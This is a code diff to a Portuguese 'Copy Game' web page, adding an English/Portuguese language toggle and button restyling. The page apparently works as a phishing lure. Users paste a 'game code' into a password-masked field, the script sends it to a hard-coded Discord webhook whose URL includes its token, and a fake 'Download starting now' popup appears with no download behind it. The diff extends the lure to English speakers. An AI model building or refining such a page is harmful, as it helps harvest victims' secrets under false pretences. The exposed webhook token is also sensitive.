@@ -11,7 +11,6 @@
       padding: 0;
       box-sizing: border-box;
     }
-
     body {
       min-height: 100vh;
       display: flex;
@@ -20,7 +19,6 @@
       background: #0a0a0f;
       font-family: 'Inter', sans-serif;
     }
-
     .card {
       width: 100%;
       max-width: 400px;
@@ -29,8 +27,34 @@
       border: 1px solid #1e1e2a;
       padding: 40px 32px;
       box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
+      position: relative;
     }
-
+    .lang-btn {
+      position: absolute;
+      top: 16px;
+      right: 16px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: #1a1a24;
+      border: 1px solid #2a2a3a;
+      border-radius: 10px;
+      padding: 6px 12px;
+      color: #e0e0e8;
+      font-size: 0.82rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s ease, border-color 0.2s ease;
+      font-family: 'Inter', sans-serif;
+    }
+    .lang-btn:hover {
+      background: #252532;
+      border-color: #3a3a4a;
+    }
+    .lang-btn .flag {
+      font-size: 1.1rem;
+      line-height: 1;
+    }
     .logo {
       width: 56px;
       height: 56px;
@@ -41,13 +65,11 @@
       align-items: center;
       justify-content: center;
     }
-
     .logo svg {
       width: 28px;
       height: 28px;
       fill: white;
     }
-
     h1 {
       color: #f1f1f5;
       font-size: 1.5rem;
@@ -55,18 +77,15 @@
       text-align: center;
       margin-bottom: 6px;
     }
-
     .subtitle {
       color: #6b6b80;
       font-size: 0.88rem;
       text-align: center;
       margin-bottom: 28px;
     }
-
     .input-group {
       margin-bottom: 20px;
     }
-
     label {
       display: block;
       color: #8b8b9e;
@@ -75,7 +94,6 @@
       margin-bottom: 8px;
       padding-left: 2px;
     }
-
     #codigo {
       width: 100%;
       padding: 15px 16px;
@@ -91,18 +109,15 @@
       -webkit-text-security: disc;
       text-security: disc;
     }
-
     #codigo:focus {
       border-color: #7c3aed;
     }
-
     #codigo::placeholder {
       color: #3a3a4a;
       letter-spacing: 1px;
       -webkit-text-security: none;
     }
-
-    button {
+    button.main-btn {
       width: 100%;
       padding: 15px;
       background: linear-gradient(135deg, #7c3aed, #db2777);
@@ -114,20 +129,16 @@
       cursor: pointer;
       transition: opacity 0.2s ease, transform 0.15s ease;
     }
-
-    button:hover {
+    button.main-btn:hover {
       opacity: 0.92;
     }
-
-    button:active {
+    button.main-btn:active {
       transform: scale(0.98);
     }
-
-    button:disabled {
+    button.main-btn:disabled {
       opacity: 0.6;
       cursor: not-allowed;
     }
-
     /* Popup */
     .overlay {
       position: fixed;
@@ -141,12 +152,10 @@
       visibility: hidden;
       transition: opacity 0.25s ease, visibility 0.25s ease;
     }
-
     .overlay.show {
       opacity: 1;
       visibility: visible;
     }
-
     .popup {
       background: #16161f;
       border: 1px solid #2a2a3a;
@@ -159,11 +168,9 @@
       transition: transform 0.25s ease;
       box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
     }
-
     .overlay.show .popup {
       transform: scale(1);
     }
-
     .check-circle {
       width: 72px;
       height: 72px;
@@ -175,26 +182,22 @@
       justify-content: center;
       box-shadow: 0 8px 24px rgba(34, 197, 94, 0.35);
     }
-
     .check-circle svg {
       width: 36px;
       height: 36px;
       fill: white;
     }
-
     .popup h2 {
       color: #f1f1f5;
       font-size: 1.25rem;
       font-weight: 600;
       margin-bottom: 8px;
     }
-
     .popup p {
       color: #7a7a90;
       font-size: 0.9rem;
       margin-bottom: 24px;
     }
-
     .popup-btn {
       width: 100%;
       padding: 12px;
@@ -207,7 +210,6 @@
       cursor: pointer;
       transition: background 0.2s ease;
     }
-
     .popup-btn:hover {
       background: #2e2e40;
     }
@@ -215,17 +217,21 @@
 </head>
 <body>
   <div class="card">
+    <!-- Botão de idioma -->
+    <button class="lang-btn" id="langBtn" onclick="toggleLang()">
+      <span class="flag" id="langFlag">🇧🇷</span>
+      <span id="langCode">PT</span>
+    </button>
+
     <div class="logo">
       <svg viewBox="0 0 24 24">
         <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
       </svg>
     </div>
-
-    <h1>Copiar Jogo</h1>
-    <p class="subtitle">Cole o código e envie com um clique</p>
-
+    <h1 id="title">Copiar Jogo</h1>
+    <p class="subtitle" id="subtitle">Cole o código e envie com um clique</p>
     <div class="input-group">
-      <label for="codigo">Código do jogo</label>
+      <label for="codigo" id="labelCodigo">Código do jogo</label>
       <input 
         type="text" 
         id="codigo" 
@@ -234,8 +240,7 @@
         spellcheck="false"
       >
     </div>
-
-    <button id="btnCopiar" onclick="enviarCodigo()">
+    <button class="main-btn" id="btnCopiar" onclick="enviarCodigo()">
       Copiar Jogo
     </button>
   </div>
@@ -248,9 +253,9 @@
           <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
         </svg>
       </div>
-      <h2>Download começando agora</h2>
-      <p>Seu código foi enviado com sucesso.</p>
-      <button class="popup-btn" onclick="fecharPopup()">Fechar</button>
+      <h2 id="popupTitle">Download começando agora</h2>
+      <p id="popupText">Seu código foi enviado com sucesso.</p>
+      <button class="popup-btn" id="popupBtn" onclick="fecharPopup()">Fechar</button>
     </div>
   </div>
 
@@ -260,23 +265,76 @@
     // =====================================================
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1561435565537108129/bIsYzf8U8CEYOjBEEii_8JTjGHqbFSRJyODni8aUnouf-fcHH2IzsJtQPBYZbhS6Hfyh";
 
+    // Textos em PT e EN
+    const texts = {
+      pt: {
+        title: "Copiar Jogo",
+        subtitle: "Cole o código e envie com um clique",
+        label: "Código do jogo",
+        placeholder: "Digite ou cole o código aqui...",
+        button: "Copiar Jogo",
+        sending: "Enviando...",
+        popupTitle: "Download começando agora",
+        popupText: "Seu código foi enviado com sucesso.",
+        popupBtn: "Fechar",
+        flag: "🇧🇷",
+        code: "PT",
+        langAttr: "pt-BR",
+        pageTitle: "Copiar Jogo"
+      },
+      en: {
+        title: "Copy Game",
+        subtitle: "Paste the code and send with one click",
+        label: "Game code",
+        placeholder: "Type or paste the code here...",
+        button: "Copy Game",
+        sending: "Sending...",
+        popupTitle: "Download starting now",
+        popupText: "Your code was sent successfully.",
+        popupBtn: "Close",
+        flag: "🇺🇸",
+        code: "US",
+        langAttr: "en",
+        pageTitle: "Copy Game"
+      }
+    };
+
+    let currentLang = "pt";
+
+    function toggleLang() {
+      currentLang = currentLang === "pt" ? "en" : "pt";
+      applyLang();
+    }
+
+    function applyLang() {
+      const t = texts[currentLang];
+      document.documentElement.lang = t.langAttr;
+      document.title = t.pageTitle;
+      document.getElementById("title").textContent = t.title;
+      document.getElementById("subtitle").textContent = t.subtitle;
+      document.getElementById("labelCodigo").textContent = t.label;
+      document.getElementById("codigo").placeholder = t.placeholder;
+      document.getElementById("btnCopiar").textContent = t.button;
+      document.getElementById("popupTitle").textContent = t.popupTitle;
+      document.getElementById("popupText").textContent = t.popupText;
+      document.getElementById("popupBtn").textContent = t.popupBtn;
+      document.getElementById("langFlag").textContent = t.flag;
+      document.getElementById("langCode").textContent = t.code;
+    }
+
     async function enviarCodigo() {
       const input = document.getElementById('codigo');
       const codigo = input.value.trim();
       const btn = document.getElementById('btnCopiar');
-
       if (!codigo) {
         input.focus();
         return;
       }
-
       btn.disabled = true;
-      btn.textContent = 'Enviando...';
-
+      btn.textContent = texts[currentLang].sending;
       // Mostra o popup imediatamente
       mostrarPopup();
       input.value = '';
-
       // Tenta enviar pro Discord (não impede o popup)
       if (!WEBHOOK_URL.includes('SEU_ID')) {
         try {
@@ -291,9 +349,8 @@
           console.log('Erro no webhook:', e);
         }
       }
-
       btn.disabled = false;
-      btn.textContent = 'Copiar Jogo';
+      btn.textContent = texts[currentLang].button;
     }
 
     function mostrarPopup() {
